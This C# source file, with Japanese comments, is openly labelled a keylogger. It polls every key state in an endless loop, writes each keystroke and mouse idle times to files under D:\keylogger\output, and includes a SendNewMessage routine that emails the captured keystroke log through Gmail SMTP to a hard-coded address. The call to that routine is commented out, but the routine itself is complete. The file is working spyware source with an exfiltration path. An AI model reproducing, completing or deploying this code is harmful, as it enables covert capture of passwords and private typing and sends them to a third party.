using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger3
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        // 打鍵カウンタ
        static long numberOfKeyStrokes = 0;

        static void Main(string[] args)
        {
            // ファイル出力パス
            String filePath = Environment.CurrentDirectory = @"D:\keylogger\output";
            String path1 = (filePath + @"\keystrokes.txt");
            String path2 = (filePath + @"\mousehook.txt");

            StringBuilder sb = new StringBuilder();

            // フォルダが存在しなければ作成
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            // ファイルが存在しなければ作成
            if (!File.Exists(path1))
            {
                using (StreamWriter sw = File.CreateText(path1))
                {
                    File.CreateText(path1);
                }
            }
            if (!File.Exists(path2))
            {
                using (StreamWriter sw = File.CreateText(path2))
                {
                    File.CreateText(path2);
                }
            }
            
            // 無限ループ
            while (true)
            {
                // pause and let other programs get a chance to run
                Thread.Sleep(5);

                // キーボード監視
                // check all keys for their state
                for (int i = 1; i < 256; i++)
                {
                    int KeyState = GetAsyncKeyState(i);

                    // print to the console
                    if ((KeyState & 1) != 0)
                    {
                        Console.Write((char)i + ", ");

                        // 打鍵キーをファイル出力
                        using(StreamWriter sw = File.AppendText(path1))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeyStrokes++;

                        // 100文字以上タイピングでデータ送信
                        if (numberOfKeyStrokes % 100 == 0)
                        {
                            // SendNewMessage();
                            System.Diagnostics.Process.Start("http://google.com");
                            // カウントリセット
                            numberOfKeyStrokes = 0;
                        }
                    }
                }

                // マウス監視
                LASTINPUTINFO lastInPut = new LASTINPUTINFO();
                lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
                lastInPut.dwTime = 0;
                int systemUptime = Environment.TickCount;
                int idleTicks = 0;

                if (GetLastInputInfo(ref lastInPut))
                {
                    int lastInputTicks = (int)lastInPut.dwTime;
                    idleTicks = systemUptime - lastInputTicks;

                    // アイドルタイムをファイル出力
                    using (StreamWriter sw = File.AppendText(path2))
                    {
                        sb.Append("現在時刻：");
                        sb.Append(DateTime.Now);
                        sb.Append(Environment.NewLine);
                        sb.Append("アイドルタイム：");
                        sb.Append(idleTicks / 1000 + "秒");
                        sb.Append(Environment.NewLine);
                        sw.Write(sb.ToString());
                        sb.Clear();
                    }
                }

            }
        } // main

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        static void SendNewMessage()
        {
            // send the contents of the text file to an external email address
            String folderName = Environment.CurrentDirectory = @"D:\keylogger\output";
            string filePath = folderName + @"\keystrokes.txt";

            String logContents = File.ReadAllText(filePath);
            String subject = "Message from keylogger";

            using (var smtp = new MailKit.Net.Smtp.SmtpClient())
            {
                try
                {
                    // メールサーバ接続情報 
                    string strHost = "smtp.gmail.com";
                    int nPort = 587;
                    MailKit.Security.SecureSocketOptions mailSecOpt = MailKit.Security.SecureSocketOptions.Auto;
                    string strUsrAddr = "k.shimazaki@wiz-net.jp";

                    // SMTPサーバに接続
                    smtp.Connect(strHost, nPort, mailSecOpt);
                    // 送信するメールを作成
                    MimeKit.MimeMessage mail = new MimeKit.MimeMessage();
                    MimeKit.BodyBuilder builder = new MimeKit.BodyBuilder();
                    mail.From.Add(new MimeKit.MailboxAddress("", strUsrAddr));
                    mail.To.Add(new MimeKit.MailboxAddress("", strUsrAddr));
                    mail.Subject = subject;
                    builder.TextBody = logContents;
                    mail.Body = builder.ToMessageBody();
                    // メールを送信
                    smtp.Send(mail);
                }
                catch(Exception exception)
                {
                    Console.WriteLine(exception.Message);
                }
                finally
                {
                    //SMTPサーバから切断する
                    smtp.Disconnect(true);
                }
            }

        }
    }
}
